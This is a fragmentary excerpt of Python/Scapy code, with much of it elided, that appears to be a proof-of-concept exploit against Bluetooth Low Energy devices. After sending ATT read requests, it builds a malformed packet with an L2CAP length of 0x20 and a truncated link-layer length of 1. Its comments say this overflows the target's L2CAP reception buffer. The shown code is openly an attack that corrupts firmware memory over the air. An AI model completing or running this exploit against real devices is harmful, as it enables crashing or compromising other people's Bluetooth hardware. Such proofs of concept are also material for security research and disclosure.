...
while True:
	...
	if data:
		...
		# 2) Receive Feature response
			...
			att_start_address += 1
			pkt = BTLE(access_addr=access_address)/ \
			BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_By_Group_Type_Request(start=att_start_address, end=0xffff, uuid=0x2800)
			driver.send(pkt) # Send ATT_Read_By_Group_Type_Request


		elif ATT_Error_Response in pkt:
			pkt = BTLE(access_addr=access_address) / \
			BTLE_DATA() / L2CAP_Hdr(len=0x20) # L2cap lengths above 6-7 in combination with the lower link layer length seems to overflow the L2cap reception buffer
			# Truncate the packet to Link Layer Length of 1 (4(access address) + 3(header + PDU) + 3(CRC))
			pkt[BTLE].len = 1 # using 1 or 2 here also triggers a overflow. This issue seems to be the inverse of truncated L2cap 
